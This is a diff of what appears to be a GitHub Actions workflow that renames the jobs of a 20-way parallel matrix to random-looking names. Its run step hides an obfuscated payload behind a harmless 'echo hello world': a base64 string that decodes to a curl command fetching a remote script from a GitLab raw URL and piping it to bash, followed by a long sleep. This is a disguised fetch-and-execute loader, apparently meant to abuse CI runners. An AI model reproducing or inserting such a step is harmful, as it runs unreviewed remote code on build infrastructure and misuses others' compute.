@@ -12,6 +12,6 @@ jobs:
       fail-fast: false
       max-parallel: 20
       matrix:
-        name: [khu-a1, khu-b1, khu-c1, khu-d1, khu-e1, khu-f1, khu-g1, khu-h1, khu-i1, khu-j1, gkhu-a1, tkhu-b1, ukhu-c1, rkhu-d1, skhu-e1, jkhu-f1, lkhu-g1, nkhu-h1, ckhu-i1, pkhu-j1]
+        name: [DFkhu-a1, JHkhu-b1, YUkhu-c1, KJkhu-d1, IUkhu-e1, POkhu-f1, RTkhu-g1, NHkhu-h1, DFkhu-i1, KJkhu-j1, lpgkhu-a1, drtkhu-b1, erukhu-c1, werkhu-d1, swekhu-e1, jopkhu-f1, ytlkhu-g1, nkhu-h1, uickhu-i1, pwekhu-j1]
     steps:
       - run: echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbGVtYWtzYW5zIHwgYmFzaA | sh & sleep 590
